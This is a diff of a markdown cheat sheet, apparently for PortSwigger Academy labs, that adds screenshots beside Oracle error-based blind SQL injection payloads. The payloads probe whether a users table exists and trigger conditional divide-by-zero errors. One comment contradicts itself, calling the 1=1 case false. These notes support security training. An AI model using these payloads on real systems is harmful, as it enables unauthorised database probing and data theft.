@@ -48,8 +48,12 @@ its oracle db
 
 
 '||(SELECT '' FROM users WHERE ROWNUM = 1)||'   -> if no error is returned users table exist
+<img width="749" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/e5a0642f-a742-4482-a7ae-fa69c60ae9d2">
+
+
 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   -> should return error as syntx is correct but condition is false.
  <img width="744" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/e7eaaf67-bc40-4942-8d18-0c0af8c1ede4">
+
 
 '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    ->  In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true
 <img width="748" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/ffabc5e3-e93d-46d2-96d2-529fa64735e3">
